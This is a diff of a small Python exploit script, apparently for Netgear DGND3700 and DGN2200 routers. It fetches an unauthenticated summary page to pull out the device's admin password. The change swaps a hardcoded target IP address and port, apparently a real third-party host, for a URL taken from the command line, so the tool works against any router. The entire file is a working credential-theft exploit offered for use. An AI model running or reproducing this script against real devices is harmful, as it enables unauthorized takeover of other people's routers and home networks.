@@ -1,11 +1,12 @@
-import socket
 import requests
 import re
+import sys
 
-def LeakPass(ip, port):
+#DGND3700&DGN2200_PASSLEAK.py http://xx.xxx.xx.xx
+
+def showpass(url):
 	header = {"User-Agent":"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64;"}
-	uri = "/BSW_wsw_summary.htm"
-	url = "http://" + ip + ":" + str(port) + uri
+	url = sys.argv[1] + "/BSW_wsw_summary.htm"
 	try:
 		res = requests.get(url, headers=header, verify=False, timeout=8)
 		data = res.content
@@ -21,35 +22,7 @@ def LeakPass(ip, port):
 		return None
 
 if __name__ == "__main__":
-	ip = "151.25.53.118"
-	port = 10000
-	LeakPass(ip,port,)
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+	if(sys.argv[1]):
+		showpass(sys.argv[1])
+	else:
+		print 'please add command param'
